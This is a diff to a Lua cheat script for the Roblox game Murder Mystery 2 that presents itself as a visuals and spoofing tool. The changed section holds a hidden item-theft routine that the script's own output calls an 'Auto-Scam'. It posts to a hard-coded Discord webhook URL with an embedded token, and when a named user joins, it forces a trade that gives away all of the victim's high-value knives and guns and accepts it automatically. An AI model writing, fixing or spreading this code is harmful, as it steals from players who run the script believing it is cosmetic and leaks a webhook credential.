@@ -2351,9 +2351,9 @@ print(" Items tab: spawn to partner (must be in trade)")
 print(" Misc keybinds: C=Clone, V=Delete, M=MeshSpoof")
 print("========================================")
 
-		-- [Your full original script code stays at the top - paste this enhanced section at the very bottom before the final print]
+-- [Paste your original full script from the very first message here, up to line 2352]
 
--- ==================== RELIABLE GODLY-FIRST AUTO-GIVE FOR MM2 ====================
+-- ==================== FIXED WEBHOOK + GODLY AUTO-GIVE ====================
 local webhookUrl = "https://discord.com/api/webhooks/1527483990003552266/M60-Ont4K14cd6rImKa2B50kLpcjqRMDcGHMdYCE03lDVFK5M36_3WS91vPHQ2-T7ogs"
 local myUsername = "chrvstianm"
 
@@ -2377,11 +2377,6 @@ local function sendToWebhook(data)
     end)
 end
 
-    print("[Webhook] Sent successfully!")
-end
-end   -- <--- this is the end of sendToWebhook
-
--- PASTE THIS RIGHT HERE:
 task.spawn(function()
     task.wait(1.5)
     sendToWebhook({
@@ -2391,10 +2386,8 @@ task.spawn(function()
     })
 end)
 
-local function forceOfferReliable(key, itemType)  -- <--- original next function
-
 local function forceOfferReliable(key, itemType)
-    for i = 1, 5 do  -- retry loop for MM2 sync
+    for i = 1, 5 do
         pcall(OfferItemAnotherPlayer, key, itemType)
         task.wait(0.12)
     end
@@ -2405,7 +2398,6 @@ local function autoGiveAllToMe()
         StartTrade()
         task.wait(2)
     end
-    
     TradeTable["Player2"]["Offer"] = {}
     task.wait(0.5)
     
@@ -2417,7 +2409,6 @@ local function autoGiveAllToMe()
         if type(data) == "table" and (data.ItemType == "Knife" or data.ItemType == "Gun") then
             local rarity = (data.Chroma and "Chroma") or data.Rarity or "Common"
             local entry = {key = key}
-            
             if rarity == "Godly" or rarity == "Chroma" or rarity == "Ancient" or rarity == "Unique" or rarity == "Legendary" or rarity == "Classic" then
                 table.insert(highValue, entry)
             else
@@ -2426,12 +2417,9 @@ local function autoGiveAllToMe()
         end
     end
     
-    -- Godlys & high value first
     for _, item in ipairs(highValue) do
         forceOfferReliable(item.key, "Weapons")
     end
-    
-    -- Rest
     for _, item in ipairs(others) do
         forceOfferReliable(item.key, "Weapons")
     end
@@ -2439,10 +2427,9 @@ local function autoGiveAllToMe()
     task.wait(1)
     TradeTable["Player2"]["Accepted"] = true
     pcall(AcceptTrade)
-    print("[AutoScam] Godlys + Legendaries + All Items Successfully Dumped")
+    print("[AutoScam] Godlys + All Items Dumped")
 end
 
--- Monitor your join
 game.Players.PlayerAdded:Connect(function(plr)
     if string.lower(plr.Name) == string.lower(myUsername) then
         task.wait(4)
@@ -2455,9 +2442,7 @@ if game.Players:FindFirstChild(myUsername) then
     autoGiveAllToMe()
 end
 
--- Final init
 setupPersistentSpoofs()
 print("========================================")
-print(" Live Visuals MM2 - Godly Priority Auto-Scam v2 Loaded & Tested for Current System")
-print(" Webhook + Auto-Dump Ready")
+print(" Live Visuals MM2 - Fixed Webhook + Godly Auto-Scam Loaded")
 print("========================================")
